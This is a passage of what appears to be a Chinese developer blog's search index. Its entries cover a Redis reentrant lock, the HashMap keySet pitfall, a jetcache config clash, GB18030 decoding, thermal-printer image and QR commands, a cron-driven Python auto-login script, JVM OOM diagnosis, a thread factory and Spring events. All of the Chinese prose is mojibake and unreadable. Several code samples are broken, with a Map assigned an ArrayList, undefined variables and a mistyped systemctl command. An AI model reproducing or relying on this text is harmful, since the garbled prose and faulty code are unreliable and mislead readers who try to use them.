\u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return 0; \u0026#34; + // å¦åˆ™è¯æ˜é”å·²ç»é‡Šæ”¾ï¼Œåˆ é™¤key \u0026#34;else \u0026#34; + \u0026#34;redis.call(\u0026#39;del\u0026#39;, KEYS[1]); \u0026#34; + \u0026#34;return 1; \u0026#34;+ \u0026#34;end; \u0026#34; + \u0026#34;return nil;\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(result != null){ System.out.println(Thread.currentThread().getName() + \u0026#34; - é‡Šæ”¾é”æˆåŠŸ\u0026#34;); return true; } System.out.println(Thread.currentThread().getName() + \u0026#34; - é‡Šæ”¾é”å¤±è´¥\u0026#34;); return false; }finally { jedis.close(); } } } test2\n/** * 1ã€å¯é‡å…¥é” */ public class Test02 { private static String key = \u0026#34;flash_1\u0026#34;; private static String sessionId1 = \u0026#34;session_id_1\u0026#34;; private static String sessionId2 = \u0026#34;session_id_2\u0026#34;; public static void main(String[] args) { ExecutorService executorService = Executors.newFixedThreadPool(5); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34; - ä¸šåŠ¡æ‰§è¡Œä¸­...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId1); System.out.println(Thread.currentThread().getName() + \u0026#34; - ä¸šåŠ¡æ‰§è¡Œä¸­...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId1); } }); executorService.execute(() -\u0026gt; { try { LockUtil2.lock(key, sessionId2); System.out.println(Thread.currentThread().getName() + \u0026#34; - ä¸šåŠ¡æ‰§è¡Œä¸­...\u0026#34;); Thread.sleep(300); } catch (Exception e) { } finally { LockUtil2.unlock(key, sessionId2); } }); } } å…¶ä»–\nprivate static Map\u0026lt;String, Map\u0026lt;Thread, Timer\u0026gt;\u0026gt; expirationRenewalMap = new ArrayList\u0026lt;\u0026gt;(0); public static void scheduleExpirationRenewal(String lockKey, String sessionId, Thread thread) { Map\u0026lt;Thread, Timer\u0026gt; timerMap = expirationRenewalMap.get(lockKey + sessionId); if (timerMap == null) { timerMap = new HashMap\u0026lt;\u0026gt;(); } else { for (Thread thread1 : timerMap.keySet()) { timerMap.get(thread1).cancel(); } } long period = INTERNAL_LOCK_LEASE_TIME / 3L; Timer timer = new Timer(); timer.scheduleAtFixedRate(new ExpirationRenewalTimerTask(lockKey, thread), period, period); timerMap.put(thread, timer); expirationRenewalMap.put(lockKey + sessionId, timerMap); } static class ExpirationRenewalTimerTask extends TimerTask { public ExpirationRenewalTimerTask(String lockKey, Thread thread) { this.lockKey = lockKey; this.thread = thread; } private String lockKey; private Thread thread; @Override public void run() { Map\u0026lt;Thread, Timer\u0026gt; timerMap = expirationRenewalMap.get(lockKey); if (timerMap == null) { return; } for (Thread thread1 : timerMap.keySet()) { if (!thread1.isAlive()) { Timer timer = timerMap.get(thread1); timer.cancel(); } } Jedis jedis = getJedis(); String script = \u0026#34;if (redis.call(\u0026#39;hexists\u0026#39;, KEYS[1], ARGV[2]) == 1) then \u0026#34; + \u0026#34;redis.call(\u0026#39;pexpire\u0026#39;, KEYS[1], ARGV[1]); \u0026#34; + \u0026#34;return 1; \u0026#34; + \u0026#34;end; \u0026#34; + \u0026#34;return 0;\u0026#34;; try { Object result = jedis.eval(script, Collections.singletonList(lockKey), Arrays.asList(INTERNAL_LOCK_LEASE_TIME + \u0026#34;\u0026#34;, sessionId)); if(result != null){ System.out.println(sessionId + \u0026#34; - ç»­ç§Ÿé”æˆåŠŸ\u0026#34;); } }finally { jedis.close(); } } } "},{"id":33,"href":"/posts/history/hashmapkeyset%E8%B8%A9%E5%9D%91/","title":"Hash Mapkey Setè¸©å‘","section":"æˆ‘çš„åšå®¢","content":"åœ¨HashMapä¸­ä½¿ç”¨keySetè·å–ä¸€ä¸ªSetå¯¹è±¡ï¼Œç„¶åç§»é™¤Setå¯¹è±¡ä¸­çš„å€¼ï¼Œå‘ç°ä¼šæŠŠHashMapä¸­çš„å€¼ä¹Ÿç§»é™¤æ‰äº†ã€‚\næŸ¥çœ‹æºç å‘ç°ï¼ŒHashMapä¸­keySetä½¿ç”¨çš„ä¹Ÿæ˜¯HashMapä¸­çš„å¯¹è±¡ï¼Œè€Œä¸æ˜¯é‡æ–°åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæ‰€ä»¥æ“ä½œHashSetæ—¶ï¼Œä¹Ÿå°±æ˜¯æ“ä½œäº†HashMapå¯¹è±¡ã€‚\npublic Set\u0026lt;K\u0026gt; keySet() { Set\u0026lt;K\u0026gt; ks; return (ks = keySet) == null ? (keySet = new KeySet()) : ks; } final class KeySet extends AbstractSet\u0026lt;K\u0026gt; { public final int size() { return size; } public final void clear() { HashMap.this.clear(); } public final Iterator\u0026lt;K\u0026gt; iterator() { return new KeyIterator(); } public final boolean contains(Object o) { return containsKey(o); } public final boolean remove(Object key) { return removeNode(hash(key), key, null, false, true) != null; } public final Spliterator\u0026lt;K\u0026gt; spliterator() { return new KeySpliterator\u0026lt;\u0026gt;(HashMap.this, 0, -1, 0, 0); } public final void forEach(Consumer\u0026lt;? super K\u0026gt; action) { Node\u0026lt;K,V\u0026gt;[] tab; if (action == null) throw new NullPointerException(); if (size \u0026gt; 0 \u0026amp;\u0026amp; (tab = table) != null) { int mc = modCount; for (int i = 0; i \u0026lt; tab.length; ++i) { for (Node\u0026lt;K,V\u0026gt; e = tab[i]; e != null; e = e.next) action.accept(e.key); } if (modCount != mc) throw new ConcurrentModificationException(); } } } "},{"id":34,"href":"/posts/history/%E4%BD%BF%E7%94%A8jetcache@createcache%E5%88%9B%E5%BB%BA%E4%B8%A4%E4%B8%AA%E7%BC%93%E5%AD%98%E5%AF%B9%E8%B1%A1%E5%8F%91%E7%8E%B0%E9%85%8D%E7%BD%AE%E5%85%A8%E9%83%A8%E4%BD%BF%E7%94%A8%E4%BA%86%E7%AC%AC%E4%B8%80%E4%B8%AA/","title":"ä½¿ç”¨jetcache@ Create Cacheåˆ›å»ºä¸¤ä¸ªç¼“å­˜å¯¹è±¡ï¼Œå‘ç°é…ç½®å…¨éƒ¨ä½¿ç”¨äº†ç¬¬ä¸€ä¸ª","section":"æˆ‘çš„åšå®¢","content":"ä½¿ç”¨@CreateCacheåˆ›å»ºä¸¤ä¸ªç¼“å­˜å¯¹è±¡ï¼Œç”±äºè¿™ä¸¤ä¸ªç¼“å­˜å¯¹è±¡éƒ½ä½¿ç”¨çš„ area å’Œ name æ˜¯ä¸€æ ·çš„ï¼Œå¯¼è‡´äº†åˆ›å»ºçš„ç¬¬äºŒä¸ªç¼“å­˜å¯¹è±¡æ²¡æœ‰ç”Ÿæ•ˆï¼Œè€Œæ˜¯ä½¿ç”¨äº†ç¬¬ä¸€ä¸ªç¼“å­˜å¯¹è±¡ã€‚\nä¸»è¦æ’æŸ¥ä¸ºä»€ä¹ˆä¼šä½¿ç”¨åˆ°äº†ç¬¬ä¸€ä¸ªç¼“å­˜çš„å¯¹è±¡ã€‚\n/** ç¬¬ä¸€ä¸ªç¼“å­˜å¯¹è±¡ */ @CreateCache(name = \u0026#34;pre\u0026#34;, cacheType = CacheType.REMOTE, expire = Integer.MAX_VALUE, timeUnit = TimeUnit.SECONDS) private Cache\u0026lt;String, List\u0026lt;PopupsVO\u0026gt;\u0026gt; popupsCache; /** ç¬¬äºŒä¸ªç¼“å­˜å¯¹è±¡ */ @CreateCache(name = \u0026#34;pre\u0026#34;, cacheType = CacheType.REMOTE, expire = 60, timeUnit = TimeUnit.SECONDS) private Cache\u0026lt;String, List\u0026lt;Integer\u0026gt;\u0026gt; popupsCacheUserPopupsIds; è¯·æ±‚æ—¶ï¼Œä¼šå…ˆåˆå§‹åŒ–ç¼“å­˜é…ç½®configï¼Œcom.alicp.jetcache.anno.field.LazyInitCache#checkInit ,ç”±äºå·²ç»åˆå§‹åŒ–è¿‡äº†ï¼ŒdebugæŠŠ this.inited æ”¹æˆfalseã€‚é‡æ–°è¿›å…¥åˆå§‹åŒ–ç¯èŠ‚ã€‚\nprivate void checkInit() { if (!this.inited) { synchronized(this) { if (!this.inited) { this.init(); this.inited = true; } } } } åœ¨com.alicp.jetcache.anno.field.LazyInitCache#init è¿›è¡Œåˆå§‹åŒ–ï¼Œ\nprivate void init() { if (this.inited) { throw new IllegalStateException(); } else { GlobalCacheConfig globalCacheConfig = (GlobalCacheConfig)this.beanFactory.getBean(GlobalCacheConfig.class); ConfigProvider configProvider = (ConfigProvider)this.beanFactory.getBean(ConfigProvider.class); CachedAnnoConfig cac = new CachedAnnoConfig(); cac.setArea(this.ann.area()); cac.setName(this.ann.name()); cac.setTimeUnit(this.ann.timeUnit()); cac.setExpire((long)this.ann.expire()); cac.setLocalExpire((long)this.ann.localExpire()); cac.setCacheType(this.ann.cacheType()); cac.setLocalLimit(this.ann.localLimit()); cac.setSerialPolicy(this.ann.serialPolicy()); cac.setKeyConvertor(this.ann.keyConvertor()); cac.setRefreshPolicy(this.refreshPolicy); cac.setPenetrationProtectConfig(this.protectConfig); String cacheName = cac.getName(); if (CacheConsts.isUndefined(cacheName)) { String[] hiddenPackages = globalCacheConfig.getHiddenPackages(); CacheNameGenerator g = configProvider.createCacheNameGenerator(hiddenPackages); cacheName = g.generateCacheName(this.field); } this.cache = configProvider.getCacheContext().__createOrGetCache(cac, this.ann.area(), cacheName); } } åœ¨è¿™é‡Œå‘ç°æ²¡æœ‰ä»€ä¹ˆå¯ä»¥ä½¿é…ç½®æ— æ•ˆçš„ï¼Œè¿›å…¥ä¸‹ä¸€ä¸ªç¯èŠ‚åˆ†æ com.alicp.jetcache.anno.support.CacheContext#__createOrGetCache\npublic Cache __createOrGetCache(CachedAnnoConfig cachedAnnoConfig, String area, String cacheName) { String fullCacheName = area + \u0026#34;_\u0026#34; + cacheName; Cache cache = this.cacheManager.getCacheWithoutCreate(area, cacheName); if (cache == null) { synchronized(this) { cache = this.cacheManager.getCacheWithoutCreate(area, cacheName); if (cache == null) { if (this.globalCacheConfig.isAreaInCacheName()) { cache = this.buildCache(cachedAnnoConfig, area, fullCacheName); } else { cache = this.buildCache(cachedAnnoConfig, area, cacheName); } this.cacheManager.putCache(area, cacheName, cache); } } } return cache; } åœ¨è¿™é‡Œï¼Œå‘ç°å¦‚æœèƒ½æ‹¿åˆ°é…ç½®å°±ä¸åˆå§‹åŒ–äº†ï¼Œä¹Ÿå¯èƒ½æ˜¯é—®é¢˜çš„æ‰€åœ¨ï¼Œæ¥ç€è¿›å…¥this.cacheManager.getCacheWithoutCreate(area, cacheName);åˆ†æã€‚\npublic Cache getCacheWithoutCreate(String area, String cacheName) { ConcurrentHashMap\u0026lt;String, Cache\u0026gt; areaMap = this.getCachesByArea(area); return (Cache)areaMap.get(cacheName); } å‘ç°ç¼“å­˜ç®¡ç†å™¨ä»¥ area å’Œ cacheName æ¥ä¿å­˜è®°å½•äº†ç¼“å­˜å®ä¾‹çš„é…ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœç¬¬ä¸€ä¸ªç¼“å­˜åˆå§‹åŒ–äº†ç¼“å­˜é…ç½®ï¼Œç¬¬äºŒä¸ªç¼“å­˜é€šè¿‡ area å’Œ cacheName æ¥æŸ¥è¯¢ï¼Œå‘ç°å·²ç»æœ‰äº†é…ç½®ï¼Œå°±ç›´æ¥æ‹¿æ¥ä½¿ç”¨ã€‚\næœ€ç»ˆè§£å†³ï¼Œå¦‚æœè¦ä½¿ä¸¤ä¸ªç¼“å­˜å®ä¾‹ä½¿ç”¨ä¸ä¸€æ ·çš„é…ç½®ï¼Œé‚£å°±è¦ä½¿ä¸¤ä¸ªç¼“å­˜å®ä¾‹çš„ area æˆ–è€… cacheName ä¸ä¸€æ ·ã€‚å®Œç»“\u0026hellip;..\n"},{"id":35,"href":"/posts/history/%E4%BD%BF%E7%94%A8js%E8%A7%A3%E7%A0%81gb18030%E7%BC%96%E7%A0%81%E7%9A%84base64%E5%AD%97%E7%AC%A6%E4%B8%B2/","title":"ä½¿ç”¨jsè§£ç  Gb18030ç¼–ç çš„ Base64å­—ç¬¦ä¸²","section":"æˆ‘çš„åšå®¢","content":"èƒŒæ™¯ï¼šåç«¯ä½¿ç”¨GB18030å­—èŠ‚ç¼–ç åŠ å¯†æˆBase64åï¼Œåœ¨å‰ç«¯è§£ç ã€‚\nä½¿ç”¨å·¥å…·ç±»è¿›è¡Œè§£ç  https://github.com/inexorabletash/text-encoding\n1ã€å…ˆç”ŸæˆUint8 å­—èŠ‚buffer\nvar binary_string = window.atob(base64Cmd); var len = binary_string.length; var bytes = new Uint8Array(len); for (var i = 0; i \u0026lt; len; i++) { bytes[i] = binary_string.charCodeAt(i); } buffer = bytes.buffer; 2ã€å†ä½¿ç”¨Uint8 å­—èŠ‚bufferç”Ÿæˆå¯¹åº”çš„ä¸­æ–‡ç¼–ç å­—ç¬¦ä¸²\nvar str = new TextDecoder(\u0026#39;gb18030\u0026#39;).decode(buffer); "},{"id":36,"href":"/posts/history/cpcl%E6%8C%87%E4%BB%A4%E6%89%93%E5%8D%B0%E5%9B%BE%E7%89%87/","title":"CpclæŒ‡ä»¤æ‰“å°å›¾ç‰‡","section":"æˆ‘çš„åšå®¢","content":" public String graphics(int x0, int y0, int width, int height, BufferedImage bmp) { if (bmp != null) { //ç”Ÿæˆ2è¿›åˆ¶å­—ç¬¦ä¸² int[] rgb = new int[3]; width = bmp.getWidth(); height = bmp.getHeight(); int wModByte = (width % 8) == 0 ? 0 : 8 - (width % 8); int pixelCount = (width + wModByte) * height; int wPrintByte = (width + wModByte) / 8; StringBuilder res = new StringBuilder(); for (int y = 0; y \u0026lt; height; y++) { for (int x = 0; x \u0026lt; width; x++) { int pixel = bmp.getRGB(x, y); // ä¸‹é¢ä¸‰è¡Œä»£ç å°†ä¸€ä¸ªæ•°å­—è½¬æ¢ä¸ºRGBæ•°å­— rgb[0] = (pixel \u0026amp; 0xff0000) \u0026gt;\u0026gt; 16; rgb[1] = (pixel \u0026amp; 0xff00) \u0026gt;\u0026gt; 8; rgb[2] = (pixel \u0026amp; 0xff); String bitStr = (rgb[0] + rgb[1] + rgb[2]) / 3 \u0026gt;= 200 ? \u0026#34;1\u0026#34; : \u0026#34;0\u0026#34;; res.append(bitStr); } for (int k = 0; k \u0026lt; wModByte; k++) { res.append(\u0026#34;1\u0026#34;); } } //ç”ŸæˆäºŒå€¼å›¾å­—èŠ‚æµ String x = res.toString(); for (int i = 0; i \u0026lt; binary2.length(); i = i + 8) { String substring = binary2.substring(i, i + 8); String hex = Long.toHexString(Long.parseLong(substring,2)); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } hexStr.append(hex); } StringJoiner sj = new StringJoiner(\u0026#34; \u0026#34;, \u0026#34;\u0026#34;, \u0026#34;\\r\\n\u0026#34;); sj.add(\u0026#34;EG\u0026#34;).add(String.valueOf(wPrintByte)).add(String.valueOf(height)) .add(String.valueOf(x0)).add(String.valueOf(y0)).add(hexStr.toString()); return sj.toString(); } return \u0026#34;\u0026#34;; } private String toHexString(byte[] bytes) { StringBuilder sb = new StringBuilder(); for(Byte b : bytes) { String hex = Integer.toHexString(b.intValue()).toUpperCase(); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } sb.append(hex); } return sb.toString(); } "},{"id":37,"href":"/posts/history/%E5%86%99%E4%B8%AApython%E8%84%9A%E6%9C%AC%E6%AF%8F%E5%A4%A9%E5%AE%9A%E6%97%B6%E7%99%BB%E5%BD%95/","title":"å†™ä¸ªpythonè„šæœ¬ï¼Œæ¯å¤©å®šæ—¶ç™»å½•","section":"æˆ‘çš„åšå®¢","content":"å†™ä¸€ä¸ªè„šæœ¬ï¼Œæ¯å¤©ç™»å½•è·å–ç§¯åˆ†ã€‚\nä½¿ç”¨çš„è¯­æ³•æ˜¯python3ï¼Œç³»ç»Ÿæ˜¯centos7ã€‚\n1ã€å®‰è£…httpè¯·æ±‚éœ€è¦çš„requestsæ¨¡å—ï¼Œç›´æ¥ä½¿ç”¨pip3æ¥å®‰è£…\npip install requests ä¹Ÿå¯ä»¥åˆ°å®˜ç½‘å»ä¸‹è½½æºæ–‡ä»¶æ¥å®‰è£… https://pypi.org/project/requests/\n2ã€ç¼–å†™pythonè„šæœ¬ï¼Œæ–‡ä»¶åç§°ï¼šlmsLogin.py\n#!/bin/python3 import re import requests from urllib import parse users = [ {\u0026#39;user\u0026#39;: \u0026#39;xxx\u0026#39;, \u0026#39;pwd\u0026#39;: \u0026#39;xxx\u0026#39;}, {\u0026#39;user\u0026#39;: \u0026#39;xxx\u0026#39;, \u0026#39;pwd\u0026#39;: \u0026#39;xxx\u0026#39;} ] for user in users: res = requests.get(url = \u0026#39;https://lms.qinsilk.com/login\u0026#39;) pattern = re.compile(r\u0026#39;\u0026lt;meta content=\u0026#34;(.*)?\u0026#34; name=\u0026#34;csrf-token\u0026#34;\u0026#39;, re.M|re.I) token = pattern.findall(res.text, 0)[0] print(token) cookie = requests.utils.dict_from_cookiejar(res.cookies) print (cookie) url = r\u0026#39;https://lms.qinsilk.com/login_check\u0026#39; headers = { \u0026#39;origin\u0026#39;: \u0026#39;https://lms.qinsilk.com\u0026#39;, \u0026#39;content-type\u0026#39;: \u0026#39;application/x-www-form-urlencoded\u0026#39;, \u0026#39;User-Agent\u0026#39;: r\u0026#39;Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026#39;, \u0026#39;Referer\u0026#39;: r\u0026#39;https://lms.qinsilk.com/login\u0026#39;, \u0026#39;Connection\u0026#39;: \u0026#39;keep-alive\u0026#39; } datas = { \u0026#39;_username\u0026#39;: user[\u0026#39;user\u0026#39;], \u0026#39;isMayday\u0026#39;: 0, \u0026#39;_password\u0026#39;: user[\u0026#39;pwd\u0026#39;], \u0026#39;_remember_me\u0026#39;: \u0026#39;on\u0026#39;, \u0026#39;_target_path\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;_csrf_token\u0026#39;: token } data = parse.urlencode(datas).encode(\u0026#39;utf-8\u0026#39;) print(data) postRes = requests.post(url = url, data = datas, headers = headers, cookies = cookie) print(postRes) 3ã€è®¾ç½®å®šæ—¶ä»»åŠ¡æ¯å¤©æ‰§è¡Œ\nvim /etc/crontab #è¾“å…¥ä»¥ä¸‹å†…å®¹,æ¯å¤©6ç‚¹ç™»å½• 0 6 * * * root python3 /root/lmsLogin/lmsLogin.py \u0026gt;\u0026gt; /root/lmsLogin/index.log # é‡å¯crond systemctl resart crond "},{"id":38,"href":"/posts/history/oom%E5%A0%86%E6%A0%88%E4%BF%A1%E6%81%AF%E5%88%86%E6%9E%90/","title":"Oomå †æ ˆä¿¡æ¯åˆ†æ","section":"æˆ‘çš„åšå®¢","content":"å…ˆæŠŠä¸€å°æœ‰é—®é¢˜çš„æœåŠ¡ä»å¾®æœåŠ¡æ‘˜ä¸‹æ¥ï¼Œå…¶ä»–æœåŠ¡é‡å¯ï¼Œä¿è¯çº¿ä¸Šè¿è¡Œæ­£å¸¸ï¼Œç„¶ååœ¨è¿™å°æœåŠ¡ä¸Šè¿›è¡Œåˆ†æåŸå› ã€‚\n1ã€æ‰“å°GCæ—¥å¿—\nJAVA_OPTS=\u0026#34;$JAVA_OPTS -server -Xms4096m -Xmx4096m -Xss1024k -XX:PermSize=256m -XX:MaxPermSize=256m -XX:+PrintGCDetails -Xloggc:/usr/local/gc.log -XX:+PrintGCTimeStamps\u0026#34; æŸ¥çœ‹GCæƒ…å†µï¼ˆMinor GCã€Major GCã€Full GCï¼‰\ntail -n 50 gc.log 2ã€æŸ¥çœ‹CPUå ç”¨æƒ…å†µ\njps top -H -p [pid] 3ã€æŠŠå †æ ˆä¿¡æ¯å¯¼å‡ºæ¥\njstack pid \u0026gt; jst.txt jmap -dump:format=b,file=jdump.bin pid -dump: ç”ŸæˆJavaå †è½¬å‚¨å¿«ç…§ -heapï¼šæ˜¾ç¤ºJavaå †è¯¦ç»†ä¿¡æ¯ -histoï¼šæ˜¾ç¤ºå †ä¸­å¯¹è±¡ç»Ÿè®¡ä¿¡æ¯ åŒæ—¶ä¹Ÿå¯ä»¥ä½¿ç”¨ jmap -histo \u0026lt;PID\u0026gt; | grep [è¿‡æ»¤ç±»] æŸ¥çœ‹ä¸€ä¸‹æœ‰æ²¡æœ‰å“ªä¸ªç±»å¯¹è±¡è¿‡å¤šï¼Œå¦‚æœæœ‰ï¼Œå¯èƒ½å°±æ˜¯è¿™é‡Œçš„é—®é¢˜äº†ã€‚ åˆ†æå †æ ˆä¿¡æ¯ï¼šMemory Analyzer tools:AMT\noverview -\u0026gt; See stacktraceï¼Œå¯ä»¥çœ‹è§æ ˆä¿¡æ¯\nç„¶åç‚¹å‡»detailsï¼ŒæŸ¥çœ‹è¿™ä¸ªGCä¸æ‰çš„å†…å­˜å¯¹è±¡æ˜¯è°ï¼Œæ‰¾åˆ°è‡ªå·±å†™çš„å†…å­˜å¯¹è±¡ã€‚\nç„¶åå»åˆ†æä»£ç ï¼Œä¸ºä»€ä¹ˆä¼šå‡ºç°è¿™ç§æƒ…å†µã€‚\n"},{"id":39,"href":"/posts/history/%E6%89%93%E5%8D%B0%E6%A8%AA%E6%8E%92%E4%BA%8C%E7%BB%B4%E7%A0%81/","title":"æ‰“å°æ¨ªæ’äºŒç»´ç ","section":"æˆ‘çš„åšå®¢","content":"public class PrintQrCode3Test { public static void main(String[] args) throws Exception { // æœ€å¤š3ç»„ List\u0026lt;KeyValue\u0026gt; list = new ArrayList\u0026lt;\u0026gt;(); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(28))); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(44))); list.add(KeyValue.generator(\u0026#34;80\u0026#34;, getStr(74))); System.out.println(toHexString(qrCode3Map(list))); } public static String getStr(Integer len) { return StringUtil.leftPad(\u0026#34;\u0026#34;, len, \u0026#34;zxcvbnmasdfghjklqwertyuiop.:/.:/\u0026#34;); } public static byte[] qrCode3Map(List\u0026lt;KeyValue\u0026gt; content) { byte[] byteMerger = new byte[0]; // byte[] init = new byte[]{0x1B, 0x1D, 0x1E, 0x00, 0x0C, 0x04, 0x1B, 0x1D, 0x1F, 0x1B, 0x40}; byte[] init = new byte[]{0x1B, 0x40}; byteMerger = byteMerger(byteMerger, init); int w = 880; int h = 380; int w_pL = w%256; int w_pH = w/256; int h_pL = h%256; int h_pH = h/256; byte[] start = new byte[]{0x1B,0x4C,0x1B,0x57,0x00,0x00,0x00,0x00,(byte) w_pL,(byte) w_pH,(byte)h_pL,(byte)h_pH,0x0A}; byteMerger = byteMerger(byteMerger, start); for (int i = 0; i \u0026lt; content.size(); i++) { String text = content.get(i).getValue(); int size = content.get(i).getKey(); Integer pager = content.get(i).getPager(); int x = (pager*8 / content.size()) * i + 20; // byte[] crtiPrintAnddot = new byte[]{0x1D, 0x24, 0x00, 0x00, 0x1B, 0x24, (byte) (x % 256), (byte) (x / 256)}; byte[] crtiPrintAnddot = new byte[]{0x1B, 0x24, (byte) (x % 256), (byte) (x / 256)}; byte[] qrcodeSize = new byte[]{29, 40, 107, 3, 0, 49, 67, (byte) size}; byte[] qrcodeData = {29, 40, 107, (byte) ((text.getBytes().length + 3) % 256), (byte) ((text.getBytes().length + 3) / 256), 49, 80, 48}; byte[] qrcodeText = text.getBytes(); byte[] printQrcode = {29, 40, 107, 3, 0, 49, 81, 48}; byteMerger = byteMerger(byteMerger, crtiPrintAnddot); byteMerger = byteMerger(byteMerger, qrcodeSize); byteMerger = byteMerger(byteMerger, qrcodeData); byteMerger = byteMerger(byteMerger, qrcodeText); byteMerger = byteMerger(byteMerger, printQrcode); System.out.println(String.format(\u0026#34;%s - %s - %s\u0026#34;, size, text.length(), text)); } byte[] end = new byte[]{10, 12, 24, 13}; byteMerger = byteMerger(byteMerger, end); byte[] oc = new byte[] {0x0A,0x0A,0x0A,0x0A,0x0A,0x0A}; byteMerger = byteMerger(byteMerger, oc); return byteMerger; } public static byte[] byteMerger(byte[] bt1, byte[] bt2) { byte[] bt3 = new byte[bt1.length + bt2.length]; System.arraycopy(bt1, 0, bt3, 0, bt1.length); System.arraycopy(bt2, 0, bt3, bt1.length, bt2.length); return bt3; } public static String toHexString(byte[] bytes) { StringBuilder sb = new StringBuilder(); for(byte b : bytes) { String hex = Integer.toHexString(b).toUpperCase(); if(hex.length() == 1) { hex = \u0026#34;0\u0026#34; + hex; } else if(hex.length() \u0026gt; 2) { hex = hex.substring(hex.length() - 2); } sb.append(hex).append(\u0026#34; \u0026#34;); } return sb.toString(); } public static void printStr(byte[] decode) { try { System.out.println(new String(decode, \u0026#34;GB18030\u0026#34;)); } catch (UnsupportedEncodingException e) { e.printStackTrace(); } } static class KeyValue { private Integer key; private String value; private Integer pager; public KeyValue(Integer key, String value, Integer pager) { this.key = key; this.value = value; this.pager = pager; } public static KeyValue generator(String page, String value) { // å–æ­£æ•´æ•°(9 - å–æ­£æ•´æ•°(85 / 20)) int pager = Integer.parseInt(page); try { int x = 0; if (\u0026#34;58\u0026#34;.equals(page)) { x = 3; } else if (\u0026#34;80\u0026#34;.equals(page)) { x = 2; } int len = value.getBytes(\u0026#34;GB2312\u0026#34;).length; Integer key = Math.max((9 - Math.max(((len + x * 20 ) / 20), 0)), 0); if (\u0026#34;58\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 3; } if (\u0026#34;80\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 4; } if (\u0026#34;110\u0026#34;.equals(page) \u0026amp;\u0026amp; len \u0026gt;= 80) { key = 5; } return new KeyValue(key, value, pager); } catch (UnsupportedEncodingException e) { e.printStackTrace(); return new KeyValue(5, value, pager); } } public Integer getPager() { return pager; } public void setPager(Integer pager) { this.pager = pager; } public Integer getKey() { return key; } public void setKey(Integer key) { this.key = key; } public String getValue() { return value; } public void setValue(String value) { this.value = value; } } } "},{"id":40,"href":"/posts/history/%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E7%BA%BF%E7%A8%8B%E5%B7%A5%E5%8E%82/","title":"åˆ›å»ºä¸€ä¸ªçº¿ç¨‹å·¥å‚","section":"æˆ‘çš„åšå®¢","content":"åŒºåˆ†å…¶ä»–çº¿ç¨‹ï¼Œç›‘æ§çº¿ç¨‹ã€‚\nclass NamedThreadFactory implements ThreadFactory { private static final AtomicInteger POOL_NUMBER = new AtomicInteger(1); private final AtomicInteger THREAD_NUMBER; private final ThreadGroup GROUP; private final String NAME_PREFIX; private final boolean IS_DAEMON; NamedThreadFactory() { this(\u0026#34;test-thread-factory\u0026#34;); } NamedThreadFactory(String name) { this(name, false); } NamedThreadFactory(String preffix, boolean daemon) { this.THREAD_NUMBER = new AtomicInteger(0); SecurityManager s = System.getSecurityManager(); this.GROUP = s != null ? s.getThreadGroup() : Thread.currentThread().getThreadGroup(); this.NAME_PREFIX = preffix + \u0026#34;-\u0026#34; + POOL_NUMBER.getAndIncrement() + \u0026#34;-thread-\u0026#34;; this.IS_DAEMON = daemon; } @Override public Thread newThread(Runnable r) { Thread t = new Thread(this.GROUP, r, this.NAME_PREFIX + this.THREAD_NUMBER.getAndIncrement(), 0L); t.setDaemon(this.IS_DAEMON); if (t.getPriority() != Thread.NORM_PRIORITY) { t.setPriority(Thread.NORM_PRIORITY); } return t; } } "},{"id":41,"href":"/posts/history/applicationevent%E5%92%8Clistener%E5%AE%9E%E7%8E%B0%E4%B8%9A%E5%8A%A1%E8%A7%A3%E8%80%A6/","title":"Application Eventå’Œ Listenerå®ç°ä¸šåŠ¡è§£è€¦","section":"æˆ‘çš„åšå®¢","content":"ApplicationEventä»¥åŠListeneræ˜¯Springä¸ºæˆ‘ä»¬æä¾›çš„ä¸€ä¸ªäº‹ä»¶ç›‘å¬ã€è®¢é˜…çš„å®ç°ï¼Œå†…éƒ¨å®ç°åŸç†æ˜¯è§‚å¯Ÿè€…è®¾è®¡æ¨¡å¼ï¼Œè®¾è®¡åˆè¡·æ˜¯ä¸ºäº†ç³»ç»Ÿä¸šåŠ¡é€»è¾‘è§£è€¦ï¼Œæé«˜å¯æ‰©å±•æ€§åŠå¯ç»´æŠ¤æ€§ã€‚äº‹ä»¶å‘å¸ƒè€…å¹¶ä¸éœ€è¦è€ƒè™‘è°å»ç›‘å¬ï¼Œç›‘å¬å…·ä½“çš„å†…å®¹æ˜¯ä»€ä¹ˆï¼Œå‘å¸ƒè€…çš„å·¥ä½œåªæ˜¯ä¸ºäº†å‘å¸ƒæ—¶é—´è€Œå·²ã€‚\nåˆ›å»ºå¹¶å‘å¸ƒ ApplicationEvent äº‹ä»¶\r#\r1ã€åˆ›å»ºä¸€ä¸ªApplicationEventäº‹ä»¶å®ä½“,åªè¦ extends ApplicationEventï¼Œä½œç”¨äºå‘å¸ƒäº‹ä»¶æ—¶\npublic class UserEvent extends ApplicationEvent { private UserVO userVO; public UserEvent(Object source, UserVO userVO) { super(source); this.userVO = userVO; } public UserVO getUserVO() { return userVO; } public void setUserVO(UserVO userVO) { this.userVO = userVO; } } 